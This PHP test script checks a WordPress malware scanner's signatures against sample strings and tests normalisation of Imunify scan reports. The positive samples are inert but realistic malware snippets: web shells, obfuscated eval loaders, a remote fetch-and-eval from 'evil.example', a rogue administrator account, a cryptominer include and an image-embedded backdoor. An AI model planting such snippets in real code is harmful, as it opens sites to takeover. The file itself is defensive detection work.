<?php
/**
 * Standalone tests for the parts of the plugin that do not need WordPress.
 *
 * Usage: php tests/run.php
 *
 * Malicious samples below are inert strings, never executed; they only need
 * to look like the real thing to the signatures.
 */

require dirname( __DIR__ ) . '/includes/class-signatures.php';
require dirname( __DIR__ ) . '/includes/class-imunify.php';

use Fckmaleware\Imunify;
use Fckmaleware\Signatures;

$failures = 0;
$checks   = 0;

function check( bool $ok, string $label ): void {
	global $failures, $checks;
	$checks++;
	if ( ! $ok ) {
		$failures++;
		echo "FAIL: {$label}\n";
	}
}

$sigs = Signatures::from_file( dirname( __DIR__ ) . '/signatures/signatures.json' );

check( array() === $sigs->invalid(), 'all bundled patterns compile' );
check( count( $sigs->all() ) >= 20, 'signature database loaded' );

// Each bundled signature must be covered by at least one positive sample.
$positive = array(
	'FMW-PHP-001' => array( 'php', '<?php eval(base64_decode("ZWNobyAxOw=="));' ),
	'FMW-PHP-002' => array( 'php', '<?php $x = gzinflate(base64_decode($p));' ),
	'FMW-PHP-003' => array( 'php', '<?php @system($_GET["cmd"]);' ),
	'FMW-PHP-004' => array( 'php', '<?php $_POST["f"]($_POST["c"]);' ),
	'FMW-PHP-005' => array( 'php', '<?php preg_replace("/.*/e", $_POST["x"], "");' ),
	'FMW-PHP-006' => array( 'php', '<?php $f = create_function("", $_REQUEST["code"]);' ),
	'FMW-PHP-007' => array( 'php', '<?php $auth_pass = ""; $default_action = "FilesMan";' ),
	'FMW-PHP-008' => array( 'php', '<?php @include "\x2fh\x6fme\x2fsite\x2fpublic_html\x2fwp-content\x2fuploads\x2f2024\x2ffavicon_7a1b.ico";' ),
	'FMW-PHP-009' => array( 'php', '<?php $GLOBALS["\x61\x62\x63"] = 1;' ),
	'FMW-PHP-010' => array( 'php', '<?php $f = ' . str_repeat( 'chr(101).', 14 ) . '"";' ),
	'FMW-PHP-011' => array( 'php', '<?php $p = "' . str_repeat( 'QUJD', 600 ) . '";' ),
	'FMW-PHP-012' => array( 'php', '<?php eval(file_get_contents("http://evil.example/p.txt"));' ),
	'FMW-PHP-013' => array( 'php', '<?php file_put_contents($_GET["n"], $_POST["d"]);' ),
	'FMW-PHP-014' => array( 'php', "<?php wp_insert_user(array('user_login'=>'x','user_pass'=>'y','role'=>'administrator'));" ),
	'FMW-PHP-015' => array( 'php', '<?php $s = "' . str_repeat( '\x41', 45 ) . '";' ),
	'FMW-PHP-016' => array( 'php', "/*<?php /**/\n@eval(\$x);" ),
	'FMW-PHP-017' => array( 'php', '<?php $f = strrev("edoced_46esab");' ),
	'FMW-PHP-018' => array( 'php', '<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_POST["dest"]);' ),
	'FMW-JS-001'  => array( 'js', 'eval(atob("YWxlcnQoMSk="));' ),
	'FMW-JS-002'  => array( 'html', '<script>document.write(unescape("%3Cscript"));</script>' ),
	'FMW-JS-003'  => array( 'js', 'var s=String.fromCharCode(' . str_repeat( '104,', 45 ) . '1);' ),
	'FMW-JS-004'  => array( 'js', 'var s=document.createElement("script");s.src="https://coinhive.com/lib/coinhive.min.js";' ),
	'FMW-HTA-001' => array( 'htaccess', "RewriteEngine On\nRewriteCond %{HTTP_REFERER} .*google.* [OR]\nRewriteCond %{HTTP_REFERER} .*bing.*\nRewriteRule ^(.*)$ http://spam.example/ [R=301,L]\n" ),
	'FMW-HTA-002' => array( 'htaccess', "AddType application/x-httpd-php .jpg\n" ),
	'FMW-CFG-001' => array( 'ini', "auto_prepend_file = /tmp/x.php\n" ),
	'FMW-IMG-001' => array( 'image', "\x00\x00\x01\x00GIF89a<?php eval(\$_POST[1]); ?>" ),
);

foreach ( $sigs->all() as $sig ) {
	check( isset( $positive[ $sig['id'] ] ), "{$sig['id']} has a positive test sample" );
}

foreach ( $positive as $id => list( $type, $sample ) ) {
	$ids = array_map(
		static function ( $m ) {
			return $m['signature']['id'];
		},
		$sigs->match( $sample, $type )
	);
	check( in_array( $id, $ids, true ), "{$id} matches its sample (got: " . implode( ',', $ids ) . ')' );
}

// Ordinary WordPress-style code must not trip any signature.
$benign = array(
	array( 'php', "<?php\n\$data = base64_decode( get_option( 'my_plugin_blob' ) );\necho esc_html( \$data );" ),
	array( 'php', "<?php\nif ( isset( \$_GET['page'] ) ) { \$page = sanitize_key( \$_GET['page'] ); }" ),
	array( 'php', "<?php\n\$out = preg_replace( '/\\s+/', ' ', \$in );\n\$out = preg_replace( '#<br\\s*/?>#i', \"\\n\", \$out );" ),
	array( 'php', "<?php\nadd_action( 'init', function () { register_post_type( 'book', array( 'public' => true ) ); } );" ),
	array( 'php', "<?php\n\$img = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';" ),
	array( 'php', "<?php\n\$user_id = wp_insert_user( array( 'user_login' => \$login, 'role' => 'subscriber' ) );" ),
	array( 'js', "jQuery(function(\$){ \$('.btn').on('click', function(){ \$(this).toggleClass('on'); }); });" ),
	array( 'js', "const label = String.fromCharCode(65, 66, 67);" ),
	array( 'htaccess', "# BEGIN WordPress\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n" ),
	array( 'image', "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" . str_repeat( "\x00\xff", 64 ) ),
);
foreach ( $benign as $i => list( $type, $sample ) ) {
	$hits = array_map(
		static function ( $m ) {
			return $m['signature']['id'];
		},
		$sigs->match( $sample, $type )
	);
	check( array() === $hits, "benign sample #{$i} produced no findings (got: " . implode( ',', $hits ) . ')' );
}

// Match metadata.
$m = $sigs->match( "<?php\n// header\n\neval(base64_decode('x'));\n", 'php' );
check( 4 === ( $m[0]['line'] ?? null ), 'line number of a match is reported' );
check( false !== strpos( $m[0]['excerpt'] ?? '', 'eval(base64_decode' ), 'excerpt contains the match' );

// Signatures only run against their target types.
check( array() === $sigs->match( 'eval(base64_decode("x"));', 'htaccess' ), 'PHP signatures ignored for .htaccess' );

// File type mapping.
check( 'php' === Signatures::file_type( 'wp-content/plugins/x/x.php' ), 'php file type' );
check( 'php' === Signatures::file_type( 'shell.PHTML' ), 'phtml is php (case-insensitive)' );
check( 'htaccess' === Signatures::file_type( 'wp-content/uploads/.htaccess' ), '.htaccess type' );
check( 'ini' === Signatures::file_type( '.user.ini' ), '.user.ini type' );
check( 'image' === Signatures::file_type( 'favicon_abc.ico' ), '.ico always scanned' );
check( null === Signatures::file_type( 'photo.jpg' ), 'jpg skipped by default' );
check( 'image' === Signatures::file_type( 'photo.jpg', true ), 'jpg scanned when enabled' );
check( null === Signatures::file_type( 'readme.txt' ), 'txt skipped' );

// Invalid patterns are dropped, not fatal.
$bad = new Signatures( array( 'signatures' => array( array( 'id' => 'BAD', 'pattern' => '~(unclosed~' ), array( 'id' => 'OK', 'pattern' => '~ok~' ) ) ) );
check( array( 'BAD' ) === $bad->invalid() && 1 === count( $bad->all() ), 'invalid pattern skipped' );

// Imunify JSON normalisation.
$root = '/home/site/public_html';
$data = array(
	'items' => array(
		array( 'file' => '/home/site/public_html/wp-content/uploads/x.php', 'type' => 'SMW-INJ-04174-bkdr', 'status' => 'found' ),
		array( 'file' => '/home/other/public_html/evil.php', 'type' => 'SMW-1', 'status' => 'found' ),
		array( 'path' => '/home/site/public_html/index.php', 'signature' => 'SMW-2' ),
		'garbage',
	),
);
$norm = Imunify::normalize_malicious( $data, $root );
check( 2 === count( $norm ), 'imunify: only files under the site root are kept' );
check( 'wp-content/uploads/x.php' === $norm[0]['file'] && 'SMW-INJ-04174-bkdr' === $norm[0]['signature'], 'imunify: file made relative, type used as signature' );
check( 'index.php' === $norm[1]['file'] && 'SMW-2' === $norm[1]['signature'], 'imunify: path/signature fallbacks' );
check( 1 === count( Imunify::normalize_malicious( array( 'data' => array( 'items' => array( $data['items'][0] ) ) ), $root ) ), 'imunify: nested data.items envelope' );
check( array() === Imunify::normalize_malicious( array( 'items' => array( array( 'file' => '/home/site/public_html_old/x.php' ) ) ), $root ), 'imunify: sibling directory with same prefix is excluded' );

echo $failures ? "\n{$failures} of {$checks} checks failed.\n" : "All {$checks} checks passed.\n";
exit( $failures ? 1 : 0 );
